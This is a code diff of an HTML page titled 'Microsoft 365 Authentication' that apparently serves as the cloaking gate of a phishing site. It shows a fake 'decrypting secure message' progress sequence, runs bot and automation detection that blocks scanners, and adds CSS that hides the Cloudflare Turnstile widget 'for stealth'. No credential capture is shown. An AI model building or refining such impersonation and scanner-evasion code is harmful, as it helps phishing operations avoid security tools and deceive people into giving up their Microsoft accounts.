@@ -4,7 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Microsoft 365 Authentication</title>
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
+    <!-- Implicit rendering: script loads and auto-renders widgets with cf-turnstile class -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
@@ -24,11 +25,19 @@
         .status-message.error { color:#a4262c; }
         .crypto-details { font-size:14px; color:#605e5c; margin-top:5px; font-family:'Consolas','Courier New',monospace; opacity:0; transition:opacity 0.3s ease; }
         .crypto-details.active { opacity:1; }
+        /* Hide any badge/space for stealth */
+        .cf-turnstile { display:none; }
     </style>
 </head>
 <body>
     <div class="loading-container">
-        <div id="cf-turnstile"></div>
+        <!-- Implicit rendering container - auto-runs on load -->
+        <div class="cf-turnstile"
+             data-sitekey="0x4AAAAAACZv1ZvxzVXICdor"
+             data-theme="auto"
+             data-callback="onTurnstileSuccess"
+             data-error-callback="onTurnstileError">
+        </div>
 
         <div class="status-container">
             <div class="progress-bar">
@@ -40,19 +49,18 @@
     </div>
 
     <script>
-        let widgetId = null;
         let turnstileToken = null;
 
         function onTurnstileSuccess(token) {
             turnstileToken = token;
-            // Optional: console.log('Token ready');
+            // console.log('Token ready'); // uncomment for debug
         }
 
         function onTurnstileError(errorCode) {
-            showError("Verification issue. Please refresh the page.");
+            showError("Verification issue. Please refresh.");
         }
 
-        // Simple bot/automation checks
+        // Bot checks
         let botDetection = { passed: false };
         let humanInteraction = { mouseMoved: false, scrolled: false };
 
@@ -82,26 +90,16 @@
             botDetection.passed = checks.filter(Boolean).length >= 3;
         }
 
-        // Track real user interaction
-        document.addEventListener('mousemove', () => {
-            if (!humanInteraction.mouseMoved && widgetId !== null) {
-                humanInteraction.mouseMoved = true;
-                turnstile.execute(widgetId);
-            }
-        }, {once: true});
-
+        document.addEventListener('mousemove', () => { humanInteraction.mouseMoved = true; }, {once: true});
         document.addEventListener('scroll', () => { humanInteraction.scrolled = true; }, {once: true});
 
-        // Animation sequence
         const loadingSequence = [
             { message: "Retrieving account details...", detail: "Fetching encrypted user metadata...", progress: 30, duration: 1000 },
             { message: "Decrypting secure message...", detail: "AES-256-GCM decryption in progress...", progress: 50, duration: 1200 },
             { message: "Verifying your session...", detail: "Validating session integrity...", progress: 100, duration: 1300 }
         ];
 
-        let currentStep = 0;
-        let isLoading = false;
-        let sequenceCompleted = false;
+        let currentStep = 0, isLoading = false, sequenceCompleted = false;
 
         function showError(msg) {
             const status = document.getElementById('statusMessage');
@@ -137,15 +135,13 @@
             sequenceCompleted = true;
 
             if (!turnstileToken) {
-                status.textContent = "Verifying humanity... please move your mouse slightly or scroll.";
+                status.textContent = "Verifying... please wait a moment or refresh if stuck.";
                 status.classList.add('active');
                 status.style.color = '#0078d4';
                 return;
             }
 
-            if (!botDetection.passed) {
-                return showError("Access restricted: automated environment detected.");
-            }
+            if (!botDetection.passed) return showError("Access restricted: automated environment detected.");
 
             if (!humanInteraction.mouseMoved || !humanInteraction.scrolled) {
                 status.textContent = "Please move mouse or scroll to proceed...";
@@ -168,26 +164,9 @@
             setTimeout(updateLoadingStep, 800);
         }
 
-        // Render Turnstile explicitly
-        function onTurnstileLoad() {
-            widgetId = turnstile.render('#cf-turnstile', {
-                sitekey: '0x4AAAAAACZv1ZvxzVXICdor',
-                theme: 'auto',
-                appearance: 'execute',
-                execution: 'execute',
-                callback: onTurnstileSuccess,
-                'error-callback': onTurnstileError
-            });
-        }
-
-        // Initialize
+        // Init
         window.addEventListener('load', () => {
             runBotChecks();
-            if (typeof turnstile !== 'undefined') {
-                onTurnstileLoad();
-            } else {
-                window.turnstileOnLoad = onTurnstileLoad;
-            }
             setTimeout(startLoginSequence, 1000);
         });
     </script>
